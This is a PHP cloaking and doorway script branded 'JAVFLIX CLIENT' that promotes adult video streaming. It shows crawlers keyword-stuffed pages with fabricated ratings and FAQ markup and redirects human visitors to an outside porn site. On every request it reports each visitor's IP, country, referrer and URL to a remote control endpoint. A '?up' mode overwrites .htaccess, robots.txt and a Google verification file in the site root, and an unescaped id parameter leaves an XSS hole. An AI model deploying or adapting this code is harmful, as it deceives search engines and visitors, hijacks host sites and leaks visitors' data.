<?php
// =============================================================
// JAVFLIX CLIENT (FINAL: OFFICIAL DESCRIPTION STYLE)
// =============================================================

$endpoint_url = "https://stepmomhub.com/seo/api.php"; 

// --- 1. DETEKSI BOT ---
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$bot_pattern = '/bot|crawl|spider|slurp|facebook|twitter|instagram|whatsapp|telegram|discord|pinterest|linkedin|snapchat|tiktok|skype|slack|google|bing|yahoo|duckduckgo|yandex|baidu|sogou|exabot|facebot|ia_archiver|semrush|ahrefs|mj12bot|dotbot|petalbot|mauibot|seo|sistrix|screamingfrog|amazon|aws|azure|curl|wget|python|java|libwww|httpclient|axios|phantomjs|headless|lighthouse|mediapartners|adsbot/i';

$is_bot = preg_match($bot_pattern, $ua);

// --- 2. FUNGSI FETCH DATA (CURL) ---
function fetchData($url, $is_bot_flag) {
    $my_domain = $_SERVER['HTTP_HOST'];
    $current_page = isset($_GET['id']) ? $_GET['id'] : 'Homepage';
    
    $ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
    $country = isset($_SERVER["HTTP_CF_IPCOUNTRY"]) ? $_SERVER["HTTP_CF_IPCOUNTRY"] : '';
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
    $full_url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    
    $params = [
        'domain'  => $my_domain,
        'page'    => $current_page,
        'country' => $country,
        'ip'      => $ip,       
        'ref'     => $referer,  
        'url'     => $full_url, 
        'bot'     => $is_bot_flag ? '1' : '0' 
    ];
    
    $query_string = http_build_query($params);
    $separator = (parse_url($url, PHP_URL_QUERY) == NULL) ? '?' : '&';
    $final_url = $url . $separator . $query_string;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $final_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
    
    $data = curl_exec($ch);
    curl_close($ch);
    
    $data = preg_replace('/[\x00-\x1F\x7F]/u', '', $data);
    return json_decode($data, true);
}

// --- 3. EKSEKUSI DATA ---
$remote_data = fetchData($endpoint_url, $is_bot);

$direct = "https://javpornsub.net";
$valid_list = [];

if ($remote_data && isset($remote_data['direct'])) {
    $direct = $remote_data['direct'];
    $valid_list = (isset($remote_data['list']) && is_array($remote_data['list'])) ? $remote_data['list'] : [];
}

// =============================================================
// LOGIKA 4: AUTO REDIRECT (USER -> DIRECT LINK)
// =============================================================
if (!$is_bot && !isset($_GET['up'])) {
    header("Location: " . $direct);
    exit;
}

// =============================================================
// FITUR: GENERATOR SITEMAP (?up=1) + FALLBACK + GOOGLE FILE
// =============================================================
if (isset($_GET['up'])) {
    @ini_set('memory_limit', '-1');
    @set_time_limit(0);
    ignore_user_abort(true);
    
    // --- FALLBACK MANUAL INPUT ---
    if (empty($valid_list)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['manual_json'])) {
            $raw_json = trim($_POST['manual_json']);
            $raw_json = preg_replace('/[\x00-\x1F\x7F]/u', '', $raw_json);
            $manual_data = json_decode($raw_json, true);
            
            if ($manual_data && isset($manual_data['list']) && is_array($manual_data['list'])) {
                $valid_list = $manual_data['list'];
                echo "<div style='background:green;color:white;padding:10px;'>✅ Data Manual Berhasil di-load!</div>";
            } else {
                echo "<div style='background:red;color:white;padding:10px;'>❌ Format JSON Salah!</div>";
            }
        } 
        
        if (empty($valid_list)) {
            ?>
            <!DOCTYPE html>
            <html>
            <head>
                <title>Sitemap Fallback</title>
                <style>body{background:#111;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;} .container{width:80%;max-width:800px;background:#222;padding:20px;} textarea{width:100%;height:300px;background:#000;color:#0f0;border:1px solid #444;} button{background:#e50914;color:white;border:none;padding:15px;width:100%;font-weight:bold;cursor:pointer;}</style>
            </head>
            <body>
                <div class="container">
                    <h2>⚠️ API Connection Failed</h2>
                    <form method="POST">
                        <textarea name="manual_json" placeholder='Paste JSON di sini...'></textarea>
                        <button type="submit">PROSES SITEMAP</button>
                    </form>
                </div>
            </body>
            </html>
            <?php
            exit;
        }
    }

    // --- PROSES SITEMAP ---
    header("Content-Type: text/plain");
    
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $current_dir = str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']); 
    $root_url = $protocol . $host . $current_dir;
    $local_dir = __DIR__;

    $all_urls = [];
    
    // 1. Tambahkan Homepage Utama
    $all_urls[] = $root_url; 
    
    // 2. Tambahkan URL SEO Khusus
    $clean_root = rtrim($root_url, '/');
    $all_urls[] = $clean_root . "/jav-sub-indo";
    $all_urls[] = $clean_root . "/jav-english-subtitle";

    // 3. Tambahkan URL Video
    foreach ($valid_list as $slug) {
        $slug = trim($slug);
        if (!empty($slug)) {
            $safe_slug = urlencode($slug);
            $all_urls[] = $root_url . "index.php?id=" . $safe_slug;
            $all_urls[] = $root_url . "index.php?id=" . $safe_slug . "&lang=indo";
        }
    }

    echo "Processing " . count($all_urls) . " URLs...\n";
    $chunks = array_chunk($all_urls, 3000);
    $sitemap_files = [];

    foreach ($chunks as $index => $chunk_data) {
        $num = $index + 1;
        $filename = "sitemap-{$num}.xml";
        $xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
        foreach ($chunk_data as $url_loc) {
            $xml .= '  <url>' . PHP_EOL;
            $xml .= '    <loc>' . htmlspecialchars($url_loc) . '</loc>' . PHP_EOL;
            $xml .= '    <lastmod>' . date('Y-m-d') . '</lastmod>' . PHP_EOL;
            $xml .= '    <priority>' . ($url_loc == $root_url ? '1.0' : '0.8') . '</priority>' . PHP_EOL;
            $xml .= '  </url>' . PHP_EOL;
        }
        $xml .= '</urlset>';
        if(file_put_contents($local_dir . '/' . $filename, $xml)) {
            echo "[OK] Generated $filename\n";
            $sitemap_files[] = $root_url . $filename;
        }
    }

    $index_xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $index_xml .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    foreach ($sitemap_files as $file_url) {
        $index_xml .= '  <sitemap>' . PHP_EOL;
        $index_xml .= '    <loc>' . htmlspecialchars($file_url) . '</loc>' . PHP_EOL;
        $index_xml .= '    <lastmod>' . date('Y-m-d') . '</lastmod>' . PHP_EOL;
        $index_xml .= '  </sitemap>' . PHP_EOL;
    }
    $index_xml .= '</sitemapindex>';
    file_put_contents($local_dir . '/sitemap.xml', $index_xml);
    echo "[SUCCESS] MASTER sitemap.xml created.\n";

    // --- UPDATE .HTACCESS (SEO URLS + GZIP) ---
    $htaccess_content = "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase " . $current_dir . "\n";
    $htaccess_content .= "RewriteRule ^jav-sub-indo/?$ index.php?id=jav-sub-indo [L]\n";
    $htaccess_content .= "RewriteRule ^jav-english-subtitle/?$ index.php?id=jav-english-subtitle [L]\n";
    $htaccess_content .= "RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>\n";
    
    $htaccess_content .= "\n<IfModule mod_deflate.c>\n";
    $htaccess_content .= "  AddOutputFilterByType DEFLATE text/plain text/html text/xml application/xml application/xhtml+xml application/rss+xml application/javascript application/x-javascript\n";
    $htaccess_content .= "</IfModule>\n";

    file_put_contents($local_dir . '/.htaccess', $htaccess_content);
    echo "[SUCCESS] .htaccess updated with Custom SEO Routes & GZIP.\n";
    
    // --- ROBOTS & GOOGLE VERIFICATION ---
    $server_root = $_SERVER['DOCUMENT_ROOT'];
    if (is_writable($server_root)) { 
        file_put_contents($server_root . "/robots.txt", "User-agent: *\nAllow: /\nSitemap: " . $root_url . "sitemap.xml\n");
        file_put_contents($server_root . "/google3b058340b0d95f2e.html", "google-site-verification: google3b058340b0d95f2e.html");
        echo "[SUCCESS] robots.txt & Google Verification created.\n";
    }

    exit;
}

// =============================================================
// LOGIKA SEO DISPLAY (TAMPILAN KHUSUS BOT / WEBSITE)
// =============================================================

header("HTTP/1.1 200 OK");
header("X-Robots-Tag: index, follow, max-image-preview:large");
header("Content-Type: text/html; charset=UTF-8");

$raw_id = isset($_GET['id']) ? $_GET['id'] : '';
$lang_mode = isset($_GET['lang']) && $_GET['lang'] == 'indo' ? 'indo' : 'en';

// DETEKSI KHUSUS UNTUK URL HOMEPAGE SEO
if ($raw_id == 'jav-sub-indo') {
    $raw_id = ''; 
    $lang_mode = 'indo';
} elseif ($raw_id == 'jav-english-subtitle') {
    $raw_id = '';
    $lang_mode = 'en';
}

$html_lang = ($lang_mode == 'indo') ? 'id' : 'en';

if (empty($raw_id)) {
    // --- HOMEPAGE LOGIC ---
    if ($lang_mode == 'indo') {
        $kode_video = "JAV SUB INDO";
        $title_page = "Jav Sub Indo: Nonton Jav Subtitle Indonesia Uncensored";
        $desc_page = "Pusat streaming Jav Sub Indo terbaru. Koleksi video Jav Subtitle Indonesia Full HD. Nonton Jav English Subtitle Uncensored tanpa sensor gratis.";
        $faq_q1 = "Nonton Jav Sub Indo dimana?";
        $faq_a1 = "JAVFLIX adalah situs resmi nonton Jav Subtitle Indonesia Full HD.";
    } else {
        $kode_video = "JAV ENGLISH SUBTITLE";
        $title_page = "Jav English Subtitle : Official Uncensored & Jav Subbed";
        $desc_page = "Official center for Jav English Subtitle videos. Watch newest Jav Eng Sub Full HD. Best Jav Sub Indo and Jav Subbed collection updated daily.";
        $faq_q1 = "Where to watch Jav English subtitle?";
        $faq_a1 = "JAVFLIX is the official source to watch Jav Subtitle English videos.";
    }
    $faq_q2 = "Is it Uncensored?";
    $faq_a2 = "Yes, our database focuses on Uncensored content.";
    $rating_val = "4.9";
    $review_count = "99800";
} else {
    // --- VIDEO PAGE LOGIC ---
    $is_valid = false;
    if ($valid_list) {
        foreach ($valid_list as $item) {
            if (strtolower(trim($item)) == strtolower(trim($raw_id))) {
                $is_valid = true; break;
            }
        }
    }
    $kode_video = strtoupper(trim($raw_id));

    if ($lang_mode == 'indo') {
        // [REQUEST KHUSUS USER]
        $title_page = "$kode_video : JAV SUB INDO";
        
        // Deskripsi sesuai permintaan: "ADALAH VIDEO RESMI..."
        $desc_page = "$kode_video adalah video resmi dari JAV, $kode_video terdapat subtitle Indonesia alias sub indo. Nonton streaming $kode_video uncensored kualitas full HD gratis di JAVFLIX.";
        
        $faq_q1 = "Link nonton $kode_video Sub Indo?";
        $faq_a1 = "Streaming $kode_video subtitle Indonesia gratis di JAVFLIX.";
    } else {
        // ENGLISH VERSION (disesuaikan agar mirip)
        $title_page = "$kode_video : JAV ENGLISH SUBTITLE";
        
        $desc_page = "$kode_video is an official video from JAV, $kode_video contains English subtitle alias Eng Sub. Watch streaming $kode_video uncensored full HD quality free on JAVFLIX.";
        
        $faq_q1 = "Where to watch $kode_video?";
        $faq_a1 = "Stream $kode_video Jav Sub English uncensored for free on JAVFLIX.";
    }
    $faq_q2 = "Is $kode_video Uncensored?";
    $faq_a2 = "Yes, $kode_video is available in Full HD Uncensored quality.";
    $rating_val = "4.8";
    $review_count = rand(20000, 50000);
}

$canonical = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$img_web    = "https://picsum.photos/seed/" . md5($kode_video) . "/1280/720"; 
$img_schema = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Big_buck_bunny_poster_big.jpg/1200px-Big_buck_bunny_poster_big.jpg";
?>
<!DOCTYPE html>
<html lang="<?= $html_lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $title_page; ?></title>
    <meta name="description" content="<?= $desc_page; ?>">
    <link rel="canonical" href="<?= $canonical; ?>">
    <link rel="alternate" hreflang="id" href="<?= "https://" . $_SERVER['HTTP_HOST'] . "?lang=indo"; ?>" />
    <link rel="alternate" hreflang="en" href="<?= "https://" . $_SERVER['HTTP_HOST']; ?>" />
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="<?= $title_page; ?>">
    <meta property="og:description" content="<?= $desc_page; ?>">
    <meta property="og:image" content="<?= $img_web; ?>">
    <meta property="og:image:alt" content="<?= $kode_video; ?> JAV Uncensored">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="<?= $title_page; ?>">
    <meta name="twitter:description" content="<?= $desc_page; ?>">
    <meta name="twitter:image" content="<?= $img_web; ?>">

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@graph": [
        { "@type": "WebPage", "@id": "<?= $canonical; ?>", "url": "<?= $canonical; ?>", "name": "<?= $title_page; ?>" },
        {
          "@type": "Movie", "name": "<?= $kode_video; ?>", "description": "<?= $desc_page; ?>",
          "image": [ "<?= $img_schema; ?>" ], "dateCreated": "<?= date('Y-m-d'); ?>",
          "inLanguage": "<?= $html_lang; ?>",
          "director": { "@type": "Person", "name": "JAVFLIX Admin" },
          "aggregateRating": { "@type": "AggregateRating", "ratingValue": "<?= $rating_val; ?>", "bestRating": "5", "worstRating": "1", "ratingCount": "<?= $review_count; ?>" }
        },
        {
            "@type": "SoftwareApplication", "name": "JAVFLIX App", "operatingSystem": "ANDROID", "applicationCategory": "MultimediaApplication",
            "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.9", "ratingCount": "<?= rand(50000, 90000); ?>", "bestRating": "5", "worstRating": "1" },
            "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" }
        },
        {
          "@type": "FAQPage",
          "mainEntity": [
            { "@type": "Question", "name": "<?= $faq_q1; ?>", "acceptedAnswer": { "@type": "Answer", "text": "<?= $faq_a1; ?>" } },
            { "@type": "Question", "name": "<?= $faq_q2; ?>", "acceptedAnswer": { "@type": "Answer", "text": "<?= $faq_a2; ?>" } }
          ]
        }
      ]
    }
    </script>
    <style>
        :root { --primary: #e50914; --bg: #000; --text: #fff; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); overflow-x:hidden; }
        .netflix-ui { position: relative; z-index: 1; min-height: 100vh; }
        nav { position:fixed; width:100%; top:0; padding:20px 4%; background:linear-gradient(to bottom, rgba(0,0,0,0.9), transparent); z-index:100; display:flex; justify-content:space-between; align-items:center; }
        .logo { color: var(--primary); font-size:32px; font-weight:900; letter-spacing:1px; text-shadow:2px 2px 5px #000; }
        .hero { height:85vh; width:100%; background: url('<?= $img_web; ?>') center/cover no-repeat; display:flex; align-items:center; padding:0 4%; position:relative; }
        .hero::after { content:''; position:absolute; inset:0; background:linear-gradient(to top, var(--bg) 10%, rgba(0,0,0,0.2) 60%, rgba(0,0,0,0.9) 100%); }
        .hero-content { position:relative; z-index:2; max-width:800px; padding-top:60px; }
        h1 { font-size: 48px; margin:15px 0; text-transform:uppercase; text-shadow: 3px 3px 10px #000; line-height:1; }
        .badges { display:flex; gap:10px; align-items:center; margin-bottom:20px; font-weight:bold; font-size:14px; }
        .badge { border:1px solid #aaa; padding:2px 6px; color:#ddd; }
        .match { color:#46d369; font-weight:bold; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; padding: 40px 4%; }
        .card { background: #222; aspect-ratio: 2/3; position: relative; border-radius:4px; overflow:hidden; text-decoration: none; display: block;}
        .card img { width:100%; height:100%; object-fit:cover; opacity:0.7; transition: 0.3s; }
        .card:hover img { opacity: 1; transform: scale(1.05); }
        .card-meta { position:absolute; bottom:0; left:0; width:100%; padding:10px; background:linear-gradient(transparent, #000); }
        footer { padding: 40px 4%; color: #757575; font-size: 13px; text-align: center; }
    </style>
</head>
<body>
    <div class="netflix-ui">
        <header>
            <nav>
                <div class="logo">JAVFLIX</div>
                <div style="color:#fff; font-weight:bold;">VIP ACCESS</div>
            </nav>
        </header>
        
        <main>
            <div class="hero">
                <div class="hero-content">
                    <span style="background:rgba(255,255,255,0.2); padding:5px 10px; font-size:12px; border-radius:2px;">OFFICIAL RELEASE</span>
                    <h1><?= $kode_video; ?></h1>
                    <div class="badges">
                        <span class="match">99% Match</span><span>2026</span><span class="badge">18+</span><span class="badge">HD</span>
                        <span><?= ($lang_mode == 'indo') ? 'Indo Sub' : 'English Sub'; ?></span>
                    </div>
                    <p style="color:#bbb; font-size:16px; margin-bottom:25px; max-width:600px; text-shadow:1px 1px 2px #000;"><?= $desc_page; ?></p>
                    <div style="margin-bottom:30px;">
                        <button style="background:#fff; color:#000; padding:10px 25px; border:none; border-radius:4px; font-weight:bold; font-size:16px; margin-right:10px; cursor:pointer;" aria-label="Play Video">▶ Play</button>
                        <button style="background:rgba(109,109,110,0.7); color:#fff; padding:10px 25px; border:none; border-radius:4px; font-weight:bold; font-size:16px; cursor:pointer;" aria-label="More Info">ⓘ Details</button>
                    </div>
                    <div style="background:rgba(0,0,0,0.6); padding:20px; border-radius:8px; border-left:4px solid #e50914;">
                        <h3 style="font-size:18px; margin-bottom:10px;">Quick Info</h3>
                        <div style="margin-bottom:10px;"><strong>Q: <?= $faq_q1; ?></strong><br><span style="color:#ccc; font-size:14px;"><?= $faq_a1; ?></span></div>
                    </div>
                </div>
            </div>
            <div style="padding:0 4%;">
                <h3 style="color:#e5e5e5; font-size:20px; margin-bottom:15px;"><?= ($lang_mode == 'indo') ? 'Rekomendasi Video' : 'New Releases'; ?></h3>
                <div class="grid">
                    <?php 
                    if($valid_list) {
                        $shuffled_list = $valid_list; shuffle($shuffled_list); $slice_list = array_slice($shuffled_list, 0, 12);
                        foreach($slice_list as $item_slug):
                            $clean_slug = trim($item_slug);
                            if(empty($clean_slug)) continue;
                            $item_title = strtoupper($clean_slug);
                            $param_lang = ($lang_mode == 'indo') ? '&lang=indo' : '';
                            $internal_link = "?id=" . urlencode($clean_slug) . $param_lang; 
                            $alt_text = "$item_title Jav Sub Indo Uncensored Full HD";
                    ?>
                    <article>
                        <a href="<?= $internal_link; ?>" class="card" aria-label="Watch <?= $item_title; ?>">
                            <img src="https://picsum.photos/seed/<?= md5($item_title); ?>/300/450" 
                                 alt="<?= $alt_text; ?>" 
                                 width="300" height="450" 
                                 loading="lazy">
                            <div class="card-meta">
                                <div style="font-size:12px; font-weight:bold; color:#fff;"><?= $item_title; ?></div>
                                <div style="font-size:10px; color:#46d369;"><?= ($lang_mode == 'indo') ? 'Sub Indo' : 'Sub English'; ?></div>
                            </div>
                        </a>
                    </article>
                    <?php endforeach; } ?>
                </div>
            </div>
        </main>

        <footer>
            <p>Copyright &copy; 2026 JAVFLIX. All Rights Reserved.</p>
        </footer>
    </div>
</body>
</html>
